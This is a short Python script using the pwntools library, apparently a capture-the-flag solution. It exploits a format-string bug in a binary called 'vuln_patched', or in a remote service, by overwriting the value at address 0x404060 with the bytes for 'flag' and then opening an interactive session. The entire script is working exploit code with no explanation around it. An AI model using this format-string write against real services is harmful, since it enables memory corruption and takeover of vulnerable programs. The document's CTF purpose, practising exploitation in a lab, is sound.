#!/usr/bin/env python3

from pwn import *
import base64

exe = ELF("./vuln_patched")

context.binary = exe
context.log_level = 'warn'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    sus = 0x404060
    nuevo_valor = 0x67616c66
    offset = 14

    payload = fmtstr_payload(offset, {sus: nuevo_valor})
    # good luck pwning :)
    r.sendlineafter('say?', payload)

    r.interactive()


if __name__ == "__main__":
    main()

